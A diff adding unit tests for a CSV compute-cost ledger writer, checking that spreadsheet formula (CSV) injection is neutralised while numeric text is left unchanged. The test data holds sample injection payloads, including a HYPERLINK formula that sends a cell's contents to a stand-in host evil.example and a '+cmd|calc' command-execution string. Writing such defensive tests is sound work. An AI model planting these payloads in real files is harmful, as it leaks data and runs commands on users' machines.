@@ -73,6 +73,29 @@ class ModalLedgerTest(unittest.TestCase):
         self.assertNotIn("app_id", row)
         self.assertEqual(row["purpose"], "generic smoke run")
 
+    def test_formula_text_is_neutralised_and_numbers_are_not(self):
+        """OWASP CSV injection: a text cell starting with = + - @, a tab or a carriage return gets a leading
+        apostrophe; numbers and numeric text such as -0.5 stay as they are."""
+        bad = {"purpose": '=HYPERLINK("http://evil.example/?"&A1,"click")', "gpu_type": "@SUM(1+1)",
+               "notes": "+cmd|calc", "gpu_count": "-x", "date_time_et": "\t=1", "cpu_seconds": "\r=1"}
+        self.assertTrue(ML.append(self.pub, {**ROW, **bad}, "job:1", public=True, generic=True))
+        (row,) = rows(self.pub)
+        for k, v in bad.items():
+            want = "'" + v + ("; autoledger job:1" if k == "notes" else "")
+            self.assertEqual(row[k], want, k)
+        nums = {"est_cost_usd": -0.5, "gpu_seconds": -3, "cpu_seconds": "-0.5", "gpu_count": "+2",
+                "actual_cost_usd_if_known": "-1.5e-3", "cumulative_usd": "12"}
+        self.assertTrue(ML.append(self.pub, {**ROW, **nums}, "job:2", public=True, generic=True))
+        row = rows(self.pub)[1]
+        self.assertEqual([row[k] for k in nums], ["-0.5", "-3", "-0.5", "+2", "-1.5e-3", "12"])
+
+    def test_committed_ledger_cells_are_written_back_unchanged(self):
+        ledger = Path(__file__).resolve().parents[1] / "docs" / "compute" / "modal-ledger.csv"
+        with open(ledger, newline="", encoding="utf-8") as fh:
+            cells = [c for r in csv.reader(fh) for c in r]
+        for c in cells + ["-0.5", "0.26596645", "-12", "+3", "1e-5", "hand, written", ""]:
+            self.assertEqual(ML._cell(c), c)
+
     def test_command_line(self):
         spec = self.d / "row.json"
         spec.write_text(json.dumps({"key": "job:1", "row": ROW, "generic": True}), encoding="utf-8")
